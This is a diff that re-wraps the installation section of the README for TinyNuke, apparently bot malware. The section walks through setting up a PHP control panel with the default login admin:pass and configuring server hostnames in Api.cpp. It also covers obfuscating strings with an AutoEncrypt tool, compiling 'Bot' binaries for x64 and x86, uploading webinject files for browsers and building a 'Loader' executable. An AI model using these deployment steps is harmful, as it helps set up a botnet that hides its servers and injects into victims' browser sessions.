@@ -12,7 +12,8 @@ Main Features:
 Installation:
 =============
 
- * To install the panel dump the db.sql file then login with the default panel credentials admin:pass and finally navigate to settings.php
+ * To install the panel dump the db.sql file then login with the default panel credentials admin:pass 
+   and finally navigate to settings.php
    (Panel does not support php running under CGI/FastCGI. You also need at least php version 5.4)
  
  * Open TinyNuke.sln and provide your server Api.cpp like this:
@@ -21,11 +22,14 @@ Installation:
    Strs::host[1] = ENC_STR_A"backup-server"END_ENC_STR;
    Strs::host[2] = 0;
 
-   To obfuscate strings between the ENC_STR_A and END_ENC_STR, backup Api.cpp then use the AutoEncrypt project, a binary is located in the root directory
+   To obfuscate strings between the ENC_STR_A and END_ENC_STR, backup Api.cpp then use the AutoEncrypt 
+   project, a binary is located in the root directory
  
- * Compile the Bot project for the x64 and x86 platforms and upload the binaries to the panel in the settings page
+ * Compile the Bot project for the x64 and x86 platforms and upload the binaries to the panel in the 
+   settings page
 
- * Upload your webinject file, format can be seen in private/injects.json in the panel folder if you have no webinjects provide an empty JSON object "{}"
+ * Upload your webinject file, format can be seen in private/injects.json in the panel folder if you have 
+   no webinjects provide an empty JSON object "{}"
  
  * Compile the Loader project to get your PE file
 
